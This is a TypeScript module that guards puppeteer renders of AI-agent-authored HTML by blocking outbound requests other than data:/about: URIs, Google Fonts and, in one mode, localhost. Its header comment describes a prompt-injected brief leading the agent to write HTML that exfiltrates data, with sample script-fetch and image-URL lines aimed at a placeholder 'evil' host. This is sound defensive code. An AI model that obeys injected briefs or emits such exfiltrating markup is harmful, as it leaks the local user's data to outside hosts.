/**
 * Network guard for puppeteer pages rendering agent-authored HTML.
 *
 * The agent that composes a Maket document is semi-trusted: a prompt-injected
 * brief can produce HTML containing `<script>fetch('https://evil/')...</script>`
 * or an `<img src="https://evil/?leak=…">`. When that HTML is rendered to PDF
 * or screenshotted by puppeteer, every outbound request resolves through the
 * Chromium that runs as the local user — so the agent's exfiltration succeeds.
 *
 * `installNetworkGuard(page, mode)` neutralises this:
 *
 *  - `mode: "offline"` — only `data:`/`about:` URIs and Google Fonts CDN
 *    requests succeed. Use for paths that inline their assets (PDF, thumbnail)
 *    but still need charte-declared web fonts so measured metrics match the
 *    live preview.
 *  - `mode: "localhost-only"` — same as offline, plus requests to `127.0.0.1`
 *    or `localhost`. Use for paths that legitimately fetch from the Maket
 *    HTTP server (layout check, preview snapshot).
 *
 * Google Fonts is whitelisted in both modes because `charteFontImport` emits
 * `@import url('https://fonts.googleapis.com/...')` for every charte-declared
 * family. Blocking that CDN made headless renders fall back to
 * `serif`/`sans-serif`/`monospace` — the layout check then measured with the
 * wrong metrics and returned "Layout OK" on pages that overflowed in the
 * user's browser (which had loaded the real fonts). Font files are inert
 * binaries and the URL is determined by static charte tokens, not runtime
 * data, so allowing the CDN does not widen the exfiltration surface.
 */

import type { Page } from "puppeteer";

export type NetworkGuardMode = "offline" | "localhost-only";

const LOCAL_HOSTNAMES = new Set(["localhost", "127.0.0.1", "::1"]);
const FONT_CDN_HOSTNAMES = new Set([
	"fonts.googleapis.com",
	"fonts.gstatic.com",
]);

export async function installNetworkGuard(
	page: Page,
	mode: NetworkGuardMode,
): Promise<void> {
	await page.setRequestInterception(true);
	page.on("request", (req) => {
		const url = req.url();
		// Always allow data: and about: (no network round-trip).
		if (url.startsWith("data:") || url.startsWith("about:")) {
			req.continue().catch(() => {});
			return;
		}
		try {
			const u = new URL(url);
			if (u.protocol === "http:" || u.protocol === "https:") {
				const hostname = u.hostname.toLowerCase();
				// Google Fonts CDN is inert and required for charte font metrics.
				if (FONT_CDN_HOSTNAMES.has(hostname)) {
					req.continue().catch(() => {});
					return;
				}
				if (mode === "localhost-only" && LOCAL_HOSTNAMES.has(hostname)) {
					req.continue().catch(() => {});
					return;
				}
			}
		} catch {
			// Malformed URL — block.
		}
		req.abort("blockedbyclient").catch(() => {});
	});
}
